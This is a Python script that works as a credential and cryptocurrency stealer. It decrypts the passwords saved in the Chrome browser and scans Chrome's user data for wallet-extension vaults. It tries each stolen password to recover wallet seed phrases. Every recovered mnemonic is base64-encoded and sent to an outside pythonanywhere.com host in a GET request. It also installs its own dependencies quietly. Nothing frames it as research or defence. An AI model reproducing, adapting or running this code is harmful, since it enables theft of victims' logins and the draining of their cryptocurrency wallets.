import os
try:
    import win32crypt
    from Crypto.Cipher import AES
except:
    os.system('pip install pycryptodome==3.18.0 pywin32==305')
    import win32crypt
    from Crypto.Cipher import AES
import json, subprocess, hashlib, base64, sqlite3, shutil,requests
from datetime import timezone, datetime, timedelta

### passwords ###
def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def googlepasswords():
    passwordlist=[]
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            #print(f"Origin URL: {origin_url}")
            #print(f"Action URL: {action_url}")
            #print(f"Username: {username}")
            #print(f"Password: {password}")
            #print(username,password)
            passwordlist.append(password)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:     
        pass
    return(passwordlist)

### vaults ###
def getvaults():
    vaults=set()
    root = os.path.join(os.environ["USERPROFILE"],"AppData", "Local", "Google", "Chrome","User Data")
    for root, dir_names, file_names in os.walk(root):
        if 'wallet.dat' in file_names:
            print(root)
        if '.txt' or ".log" or ".ldb" in file_names:
            for file in file_names:
                if file[-4:]=='.txt' or file[-4:]=='.log':
                    target=root+"/"+file
                    try:
                        with open(target,errors="ignore",encoding="ASCII") as f:
                            data=f.read()
                        if '"vault":"' in data:
                            pos=data.find("vault")
                            pos2=data.find("value")
                            pos3=data.find("permissions")

                            res=(data[pos:pos+1200]+'\n')
                            resend=res.find('"}')
                            while True:
                                if '\\"' in res: 
                                    res=res.replace('\\"','"')
                                else:
                                    break
                            finalres="{"+(res.split('"}')[0]+'"')+"}"
                            finalres.replace('\n','')
                            vaults.add(finalres[9:])
                    except:continue
    return vaults

### vault decryption ###
def utf8_to_buffer(str):
    return str.encode('utf-8')
def base64_to_buffer(base64str):
    # Check if padding is needed
    padding_needed = len(base64str) % 4 != 0
    if padding_needed:
        padding_length = 4 - (len(base64str) % 4)
        base64str += "=" * padding_length

    return base64.b64decode(base64str)
def key_from_password(password, salt):
    pass_buffer = utf8_to_buffer(password)
    salt_buffer = base64_to_buffer(salt)

    key = hashlib.pbkdf2_hmac(
        'sha256', pass_buffer, salt_buffer, 10000, dklen=32
    )
    return key
def decrypt(password, payload):
    payload=eval(payload)
    key=key_from_password(password,payload['salt'])
    encrypted_data = base64_to_buffer(payload['data'])
    vector = base64_to_buffer(payload['iv'])
    cipher = AES.new(key, AES.MODE_GCM, nonce=vector)
    decrypted_data = cipher.decrypt(encrypted_data)
    decrypted_data = decrypted_data.split(b'"mnemonic":')[1].split(b',"')[0].decode()
    decrypted_data = ''.join(chr(num) for num in eval(decrypted_data))
    return decrypted_data

### run ####
def run():
    if not os.path.exists("results.txt"): 
        with open("results.txt",'w') as f:f.write('')
    mems=[]
    passwordlist=googlepasswords()
    vaults=getvaults()
    for password in passwordlist:
    	for data in vaults:
            try:
                mem=decrypt(password,data)
                if mem not in mems:
                    print(mem)
                    mems.append(mem)
                    b64mem=base64.b64encode(mem.encode()).decode()
                    print(b64mem)
                    requests.get(f"http://surrealsocials.pythonanywhere.com/mems?mem={b64mem}")
                    with open('results.txt','r') as f:
                        if mem not in f.read():
                            with open('results.txt','a') as f:
                                f.write(mem+'\n')
            except:continue
if __name__=="__main__":
	run()
